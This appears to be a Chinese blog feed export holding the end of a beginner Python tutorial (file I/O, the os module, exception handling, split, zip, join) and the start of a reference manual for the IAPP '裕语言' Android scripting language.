<p>下面这个就是往a.txt写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=open(<span class="string">&quot;a.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="close-关闭文件"><a href="#close-关闭文件" class="headerlink" title="close()关闭文件"></a>close()关闭文件</h2><p>关闭文件</p>
<p>格式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">a=open(<span class="string">&quot;a.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">.....</span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">a.close()</span><br></pre></td></tr></table></figure>
<h2 id="read-读取文件"><a href="#read-读取文件" class="headerlink" title="read()读取文件"></a>read()读取文件</h2><p>读取整个文件，将文件内容放到一个字符串变量中</p>
<p><strong>a.txt文件内容</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaaa</span><br><span class="line">bbbbb</span><br><span class="line">ccccc</span><br><span class="line">ddddd</span><br><span class="line">eeeee</span><br></pre></td></tr></table></figure>
<p><strong>read.py文件内容</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件不添加打开方式默认是r</span></span><br><span class="line">a=open(<span class="string">&#x27;a.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件内容</span></span><br><span class="line">b=a.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出文件内容</span></span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">a.close()</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaaa</span><br><span class="line">bbbbb</span><br><span class="line">ccccc</span><br><span class="line">ddddd</span><br><span class="line">eeeee</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="readline-读取一行"><a href="#readline-读取一行" class="headerlink" title="readline()读取一行"></a>readline()读取一行</h2><p>读取一行，然后他会移动到下一行</p>
<p><strong>a.txt文件内容</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaaa</span><br><span class="line">bbbbb</span><br><span class="line">ccccc</span><br><span class="line">ddddd</span><br><span class="line">eeeee</span><br></pre></td></tr></table></figure>


<p><strong>read.py文件内容</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件不添加打开方式默认是r</span></span><br><span class="line">a=open(<span class="string">&#x27;/home/zss/杂东西/a.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取一行，然后他会移动到下一行</span></span><br><span class="line">b=a.readline()</span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line">print(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">a.close()</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaaa</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>读取文件的全部内容</strong></p>
<p><strong>a.txt文件内容</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaaa</span><br><span class="line">bbbbb</span><br><span class="line">ccccc</span><br><span class="line">ddddd</span><br><span class="line">eeeee</span><br></pre></td></tr></table></figure>


<p><strong>read.py文件内容</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件不添加打开方式默认是r</span></span><br><span class="line">a=open(<span class="string">&#x27;a.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 死循环</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取一行，然后他会移动到下一行</span></span><br><span class="line">    b=a.readline()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断b是否等于假，等于假然后not取反就等于真</span></span><br><span class="line">    <span class="comment"># not与逻辑运算结果相反</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> b:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出</span></span><br><span class="line">    print(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">a.close()</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaaa</span><br><span class="line"></span><br><span class="line">bbbbb</span><br><span class="line"></span><br><span class="line">ccccc</span><br><span class="line"></span><br><span class="line">ddddd</span><br><span class="line"></span><br><span class="line">eeeee</span><br></pre></td></tr></table></figure>
<h2 id="write-写文件"><a href="#write-写文件" class="headerlink" title="write()写文件"></a>write()写文件</h2><p>要以写入的方式要添添加<code>w</code>写入模式，<code>a</code>附加模式（就是在文件最后添加），然后你想读和写可以用<code>r+</code></p>
<p>如果我们写的文件不存在<code>w</code>会创建一个文件，然后这个文件存在<code>w</code>会清除里面的内容</p>
<p><strong>read.py文件内容</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 写入文件的方式打开</span></span><br><span class="line">a=open(<span class="string">&#x27;a.txt&#x27;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向a.txt文件里面写入abc</span></span><br><span class="line">a.write(<span class="string">&quot;abc&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">a.close()</span><br></pre></td></tr></table></figure>
<p>看一下a.txt文件</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210201123159523.png" alt="image-20210201123159523"></p>
<h1 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h1><p>应为OS模块文件太多了我就列出几个常用的</p>
<table>
<thead>
<tr>
<th>os模块常用方法</th>
<th>相应的作用</th>
</tr>
</thead>
<tbody><tr>
<td>os.getcwd()</td>
<td>返回当前工作目录</td>
</tr>
<tr>
<td>os.listdir(文件夹名)</td>
<td>目录列表</td>
</tr>
<tr>
<td>os.mkdir(文件夹名)</td>
<td>创建文件，只能创建一个单层文件，而不能嵌套创建，若文件夹存在则会抛出异常</td>
</tr>
<tr>
<td>os.makedirs(文件夹名/文件夹名)</td>
<td>创建多层目录 ，可以嵌套创建</td>
</tr>
<tr>
<td>os.rmdir(文件夹名)</td>
<td>删除单层目录，遇见目录非空时则会抛出异常</td>
</tr>
<tr>
<td>os.rename(文件名,文件名)</td>
<td>修改文件名</td>
</tr>
<tr>
<td>我下面就随便演示一个</td>
<td></td>
</tr>
</tbody></table>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入os模块</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件</span></span><br><span class="line">a=os.mkdir(<span class="string">&quot;aaaaaaa&quot;</span>)  </span><br></pre></td></tr></table></figure>
<p>结果</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210201125428578.png" alt="image-20210201125428578"></p>
<h1 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h1><p>在python如果代码出差他就会结束代码，我们要加上异常他还回正常执行后面的代码</p>
<h2 id="简单捕获异常"><a href="#简单捕获异常" class="headerlink" title="简单捕获异常"></a>简单捕获异常</h2><p><strong>格式</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 正常的语句</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="comment"># 正常的语句错误就会执行这个</span></span><br></pre></td></tr></table></figure>
<p><strong>演示</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(a)</span><br><span class="line">print(<span class="string">&quot;被执行了！&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>结果可以看见报错了，应为没有a这个变量，后面的代码就不会在执行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&#x2F;home&#x2F;zss&#x2F;杂东西&#x2F;a.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    print(a)</span><br><span class="line">NameError: name &#39;a&#39; is not defined</span><br></pre></td></tr></table></figure>
<p><strong>我们用异常来处理</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(a)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">&quot;上面有错误！&quot;</span>)</span><br><span class="line">    </span><br><span class="line">print(<span class="string">&quot;被执行了！&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">上面有错误！</span><br><span class="line">被执行了！</span><br></pre></td></tr></table></figure>
<h2 id="指定错误类型处理"><a href="#指定错误类型处理" class="headerlink" title="指定错误类型处理"></a>指定错误类型处理</h2><h3 id="查看错误类型"><a href="#查看错误类型" class="headerlink" title="查看错误类型"></a>查看错误类型</h3><p><strong>代码</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(a)</span><br><span class="line">print(<span class="string">&quot;被执行了！&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>结果可以看见报错了，应为没有a这个变量，后面的代码就不会在执行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&#x2F;home&#x2F;zss&#x2F;杂东西&#x2F;a.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    print(a)</span><br><span class="line">NameError: name &#39;a&#39; is not defined</span><br></pre></td></tr></table></figure>
<p><code>NameError</code>就是错误类型</p>
<h3 id="指定错误类型处理-1"><a href="#指定错误类型处理-1" class="headerlink" title="指定错误类型处理"></a>指定错误类型处理</h3><p>格式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 正常的语句</span></span><br><span class="line"><span class="keyword">except</span> 指定的错误类型:</span><br><span class="line">    <span class="comment"># 正常的语句错误就会执行这个</span></span><br></pre></td></tr></table></figure>
<p>演示</p>
<p>下面代码没有定义a变量就会报错<code>NameError</code>类型的错误</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(a)</span><br><span class="line"><span class="keyword">except</span> NameError:</span><br><span class="line">    print(<span class="string">&quot;上面有错误！&quot;</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;被执行了！&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">上面有错误！</span><br><span class="line">被执行了！</span><br></pre></td></tr></table></figure>
<h2 id="捕获未知错误"><a href="#捕获未知错误" class="headerlink" title="捕获未知错误"></a>捕获未知错误</h2><p>格式</p>
<p>下面如果正常的语句错误就会被捕获然后，会吧错误信息给下面那个变量名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 正常的语句</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> 变量名:</span><br><span class="line">    <span class="comment"># 正常的语句错误就会执行这个</span></span><br></pre></td></tr></table></figure>
<p>演示</p>
<p>如果上面有错误就会吧错误信息给b那个变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(a)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> b:</span><br><span class="line">    print(<span class="string">&quot;未知错误：&quot;</span>+str(b))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">未知错误：name &#39;a&#39; is not defined</span><br></pre></td></tr></table></figure>
<h2 id="其他异常语法"><a href="#其他异常语法" class="headerlink" title="其他异常语法"></a>其他异常语法</h2><p> <code>else</code>没有错误的时候执行</p>
<p><code>finally</code>什么时候都会执行</p>
<p><strong>演示有错误</strong></p>
<p>代码</p>
<p>下面的a变量没有定义</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(a)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> b:</span><br><span class="line">    print(<span class="string">&quot;未知错误：&quot;</span>+str(b))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;上面没有错误！&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    print(<span class="string">&quot;什么时候都会执行！&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">未知错误：name &#39;a&#39; is not defined</span><br><span class="line">什么时候都会执行！</span><br></pre></td></tr></table></figure>
<p><strong>演示没有错误</strong></p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    a=<span class="string">&quot;aaaa&quot;</span></span><br><span class="line">    print(a)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> b:</span><br><span class="line">    print(<span class="string">&quot;未知错误：&quot;</span>+str(b))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&quot;上面没有错误！&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    print(<span class="string">&quot;什么时候都会执行！&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aaaa</span><br><span class="line">上面没有错误！</span><br><span class="line">什么时候都会执行！</span><br></pre></td></tr></table></figure>
<p><code>raise</code>关键字用于引发异常，您可以定义要引发的错误类型以及要向用户打印的文本</p>
<p>代码，他就会指定你报的错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; raise StopIteration</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">StopIteration</span><br></pre></td></tr></table></figure>


<h1 id="常用的函数-1"><a href="#常用的函数-1" class="headerlink" title="常用的函数"></a>常用的函数</h1><h2 id="split-分隔"><a href="#split-分隔" class="headerlink" title="split()分隔"></a>split()分隔</h2><div class="note info simple"><p>他就是分割用的一个方法，下面这样你应该就能看懂了</p>
</div>

<ol>
<li><p>演示1</p>
<p>下面这个用的<code>:</code>进行分割的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="string">&#x27;dasdasdasdas:122:@#@$@&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a.split(<span class="string">&#x27;:&#x27;</span>))  <span class="comment"># 以:来分</span></span><br><span class="line">[<span class="string">&#x27;dasdasdasdas&#x27;</span>, <span class="string">&#x27;122&#x27;</span>, <span class="string">&#x27;@#@$@&#x27;</span>]</span><br></pre></td></tr></table></figure>


</li>
</ol>
<ol start="2">
<li><p>演示2</p>
<p>下面这个用的<code>|</code>进行分割的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="string">&#x27;dasdasdasdas|@#@$@|12122&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a.split(<span class="string">&#x27;|&#x27;</span>))</span><br><span class="line">[<span class="string">&#x27;dasdasdasdas&#x27;</span>, <span class="string">&#x27;@#@$@&#x27;</span>, <span class="string">&#x27;12122&#x27;</span>]</span><br></pre></td></tr></table></figure></li>
<li><p>演示3</p>
<p>下面这个用的<code>==</code>进行分割的，然后加一个1他就会输出二个参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="string">&#x27;dasdasdasdas==@#@$@==12122&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(a.split(<span class="string">&#x27;==&#x27;</span>,<span class="number">1</span>))</span><br><span class="line">[<span class="string">&#x27;dasdasdasdas&#x27;</span>, <span class="string">&#x27;@#@$@&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h1 id="sys标准库使用"><a href="#sys标准库使用" class="headerlink" title="sys标准库使用"></a>sys标准库使用</h1></li>
</ol>
<h2 id="isinstance-函数"><a href="#isinstance-函数" class="headerlink" title="isinstance()函数"></a>isinstance()函数</h2><div class="note info simple"><p>isinstance()函数来判断一个对象是否是一个已知的类型</p>
<p>sinstance() 与 type() 区别：</p>
<ul>
<li>type() 不会认为子类是一种父类类型，不考虑继承关系。</li>
<li>isinstance() 会认为子类是一种父类类型，考虑继承关系。</li>
</ul>
<p>如果要判断两个类型是否相同推荐使用 isinstance()。</p>
</div>

<div class="note info simple"><p>他的格式</p>
</div>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">isinstance(object, classinfo)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="center">参数</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">object</td>
<td align="right">实例对象</td>
</tr>
<tr>
<td align="center">classinfo</td>
<td align="right">可以是直接或间接类名、基本类型或者由它们组成的元组</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">1111</span></span><br><span class="line">print(isinstance(a,int))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">True</span><br></pre></td></tr></table></figure>
<h2 id="zip函数"><a href="#zip函数" class="headerlink" title="zip函数"></a>zip函数</h2><p>zip() 是内置函数，它可以将多个序列（列表、元组、字典、集合、字符串以及 range() 区间构成的列表）“压缩”成一个 zip 对象。所谓“压缩”，其实就是将这些序列中对应位置的元素重新组合，生成一个个新的元组。</p>
<p>常使用的方式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">b=[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i,x <span class="keyword">in</span> zip(a,b):</span><br><span class="line">    print(i)</span><br><span class="line">    print(x)</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>
<p>我们可以叫zip对象强转成一个列表用<code>list()</code>函数</p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">b=[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">print(list(zip(a,b)))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[(<span class="number">1</span>, <span class="number">4</span>), (<span class="number">2</span>, <span class="number">5</span>), (<span class="number">3</span>, <span class="number">6</span>)]</span><br></pre></td></tr></table></figure>
<p>如果里面内容长度不一样他会按照最短的那个了匹配</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">b=[<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">print(list(zip(a,b)))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[(1, 4), (2, 5)]</span><br></pre></td></tr></table></figure>
<h2 id="join-方法"><a href="#join-方法" class="headerlink" title="join()方法"></a>join()方法</h2><p>方法返回一个被子字符串连接的字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;-&#x27;</span>.join(a))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1-2-3-4</span><br></pre></td></tr></table></figure>
<p>用无的字符连接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=[<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>]</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(a))</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1234</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>Python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>IAPP裕语言手册</title>
    <url>/2021/02/28/IAPP/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>《裕语言》是一基于java的扩展性脚本语言，丰富的类库定置简单快速开发你的应用程序，让开发过程变得娱乐化大众化。《裕语言》是由游改乐计算编程工程师 黄裕先生、宇恒先生 定制以及实现成型代码功能，其代码简单方便的编写体验是一大亮点，目前还会有更多强大的功能完善中。iApp是基于裕语言平台上运行的应用程序，全面向公众开放开放平台，任何有兴趣的人都可以参与开放设计自己的程序。</p>
<p>【3.0 iyu升级简介】</p>
<ol>
<li>uigo代码必须加文件后缀，如 uigo(“a.iyu”) 或 uigo(“a.ilua”)。 否则将会闪退等。</li>
<li>uls必须正确的 输入界面宽度，输入界面高度。 否则界面列表可能异常。</li>
<li>代码中双引号需进行转义，如 fw(“%a.txt”, “ab”cd”) 修改成 fw(“%a.txt”, “ab&quot;cd”)</li>
</ol>
<p>【s 变量】<br>用法：</p>
<p>//申明一个变量，如果不赋值，系统将默认赋值 null</p>
<p>s a</p>
<p>申明事件局部变量<br>//可以赋数值<br>s a = 123<br>tw(a)</p>
<p>s 我是变量 = 123<br>tw(我是变量)</p>
<p>申明界面变量<br>//可以赋字符串<br>ss a = “123”<br>tw(ss.a)</p>
<p>申明全局变量<br>//可以赋其他变量<br>sss b = a<br>tw(sss.b)</p>
<p>区域介绍：<br>局部变量：服务于一个事件，当用户与界面发生交互时，产生一个事件，仅供于该事件的变量产生以及操作。<br>界面变量：生产界面变量后，同一个界面中的所有事件，均可对其进行操作。<br>全局变量：生产全局变量后，同一个应用中的所有事件，均可对其进行操作。</p>
<p>说明：<br>变量类似一个箱子，你可以把数据储存在里面，等需要的时候就取出来使用，可以改变它装你想要装的数据。裕语言中的变量是可以根据赋值，而且自动转换的，所以无需申明数据类型。</p>
<p>提示：<br>变量的定义规范， 以 “s、ss、sss”开头。 然后加上自己自定义的变量名，比如“abc、 nihao、sfw123、www_zzw”变量不允许全部为数字，不允许掺杂符号，请不要使用太长的变量名，不推荐使用中文作为变量名。</p>
<p>空值：<br>如果访问一个没有声明的变量，将返回“null”空值类型，这个不对等于字符的 ‘null’。<br>判断是否空值的例子:(这里我们不知道变量“abc”是否空值)<br>f(abc == null)<br>{<br>    syso(“是null”)<br>}</p>
<p>【// 或 /. ./ 注释语句】<br>用法<br>//这个是变量“a”它的值等于“1”<br>s a = 1<br>//这个是变量“b”它的值等于“2”<br>s b = 2</p>
<p>/.<br>大量代码注释方法<br>s c = 3<br>s d = 4</p>
<p>./</p>
<p>说明：<br>注释语句符号可以用“//”，以注释符号开头的正行，将会被代码执行器无视。通常用于给自己标示代码的含义</p>
<p>提示：<br>此注释语句可用于属性。</p>
<p>提示：<br>不支持代码尾部使用注释语句，注释行必须开头为注释符，举错误的例：</p>
<p>s a = 1 //这个是变量“a”它的值等于“1”<br>//这个是变量“b”它的值等于“2” s b = 2</p>
<p>【syso 打印】<br>用法：<br>syso(“1314”)<br>可以打印出数据，代码同等于 System.out.println(“1314”)，可以在测试时，选择 调试日志查看打印数据。</p>
<p>说明：<br>打包后，安装运行可以通过 Log Tag：iapp 进行监听数据。</p>
<p>【f 判断语句】<br>用法：<br>s a = 2<br>f(a == 1)<br>{<br>    syso(“等于1”)<br>}<br>else f(a == 2)<br>{<br>    syso(“等于2”)<br>}<br>else<br>{<br>    syso(“等于其他”)<br>}</p>
<p>s a = 1<br>s b = 1<br>f(a == b)<br>{<br>    syso(“等于”)<br>}<br>else<br>{<br>    syso(“不等于”)<br>}</p>
<p>s a = “nimei”<br>s b = “nimei”<br>f(a == b)<br>{<br>    syso(“等于”)<br>}<br>else<br>{<br>    syso(“不等于”)<br>}</p>
<p>s a = 1<br>s b = 2<br>f(!a == b)<br>{<br>    syso(“等于”)<br>}<br>else<br>{<br>    syso(“不等于”)<br>}</p>
<p>s a = 1<br>s b = 2<br>s c = 3<br>f(a &lt; b &amp;&amp; b &lt; c)<br>{<br>    syso(“等于”)<br>}<br>else<br>{<br>    syso(“不等于”)<br>}</p>
<p>s a = 1<br>s b = 2<br>s c = 2<br>f(a == b || b == c)<br>{<br>    syso(“等于”)<br>}<br>else<br>{<br>    syso(“不等于”)<br>}</p>
<p>说明：<br>条件判断语句，用于两个值的比较，常用于判断值是否对等与数值的大小，判断数据需要同类型数据对比。表达式返回的“是”，那么将执行 { 代码 } 里面的代码。“否”将执行else后面的代码（不支持运算表达式，例：a+b=2）</p>
<p>支持运算符（返回 是 与 否）：<br>== 是否对等<br>!= 是否不等于</p>
<blockquote>
<p>= 是否大于或等于<br>&lt;= 是否小于或等于<br>是否大于<br>&lt; 是否小于<br>?* 字符串开通是否相同<br>*? 字符串结尾是否相同<br>? 字符串是否被包含<br>上面三个举例：<br>s a = “abcdef”<br>f(a ?* “abc”) 返回“是”<br>f(a *? “def”) 返回“是”<br>f(a ? “cde”) 返回“是”</p>
</blockquote>
<p>支持逻辑运算符：<br>|| 或者<br>&amp;&amp; 并且<br>! 反意</p>
<p>【w 循环】<br>用法：<br>//这将循环99次<br>s a = 99<br>w(a &gt; 0)<br>{<br>syso(a)<br>s(a - 1, a)<br>}</p>
<p>说明：<br>条件循环语句，比较值的变化，然后进行循环执行 { 代码 } 里面的代码。当条件为“否”的时候会停止循环，条件“是”的话，将一直循环执行。<br>支持运算符（返回 是 与 否）：（跟 f 语句 一样，请参考）</p>
<p>【for 循环】<br>用法：<br>for(1; 20)<br>{<br>    syso(“循环20次”)<br>}</p>
<p>s a = 1<br>s b = 10<br>for(a; b)<br>{<br>    syso(“循环10次”)<br>}</p>
<p>说明：<br>参数可以给予另个参数，一个为初始循环的值，一个是最大循环值。</p>
<p>【t 新线程】<br>用法：<br>t()<br>{<br>    syso(“新线程里执行代码”)<br>}</p>
<p>说明：<br>启用新线程，去执行一些需要执行很久的代码。比如把下载文件，获取网页源码，大量的文件操作，可以放入新线里执行。这里线程的概念，启用新的线程帮你处理代码，这样不会影响到主线程。</p>
<p>【ssj 设置或修改控件事件代码】<br>用法：<br>s id = 3<br>ssj(id, “clicki”)<br>{<br>tw(“ok”)<br>}</p>
<p>说明：<br>输入控件Id，输入事件类型，并将事件代码填写在 { 中 }，动态控件将触发该事件代码。</p>
<p>事件类型：<br>clicki=单击事件<br>touchmonitor=触屏监听事件<br>press=触屏长按事件<br>keyboard=键盘触发事件<br>pressmenu=触屏长按菜单事件<br>editormonitor=框编辑监听事件<br>ontextchanged=文本内容已改变<br>beforetextchanged=文本内容改变之前<br>aftertextchanged=文本内容改变之后<br>focuschange=获得焦点事件<br>onscrollstatechanged=滚动状态已改变<br>onscroll=滚动<br>clickitem=单击项目事件<br>onprogresschanged=加载过程进度改变<br>shouldoverrideurlloading=加载网址之前<br>ondownloadstart=文件下载事件<br>onpageselected=滑动切换界面事件<br>onpagescrolled=滑动切换界面过程<br>onpagescrollstatechanged=滑动操作过程<br>ondrawerclosed=侧滑关闭事件<br>ondraweropened=侧滑展示事件<br>onoptionsitemselected=项目选择<br>onitemselected=选择项目事件</p>
<p>【tw 提示】<br>用法：<br>tw(“你好”)</p>
<p>//设置参数1：显示的时间长久；0：显示的时间短暂；\n为换行的意思，其他地方通用<br>tw(“你好\n吗？”, 1)</p>
<p>说明：<br>用于提醒用户，界面显示时长大约为 2秒钟。弹出代码中的文字，来提醒用户。</p>
<p>【fd 删除文件】<br>用法：(将删除SD卡根目录的abc.zip文件)<br>s a = “%abc.zip”<br>fd(a, b)<br>tw(b)</p>
<p>说明：<br>用于删除指定的文件，是否成功返回数据：true或 false</p>
<p>提示：同时将创建变量“b”，作为记录返回的值。（通用于下咧）</p>
<p>【fe 文件是否存在】<br>用法：(将判断SD卡根目录的abc.zip文件是否存在)<br>s a = “%abc.zip”<br>fe(a, b)<br>tw(b)</p>
<p>说明：<br>用于判断指定的文件存在，是否存在返回数据：true或 false</p>
<p>【fs 文件大小】<br>用法：(将获取SD卡根目录的abc.zip文件占用的大小)<br>s a = “%abc.zip”<br>fs(a, b)<br>tw(b)</p>
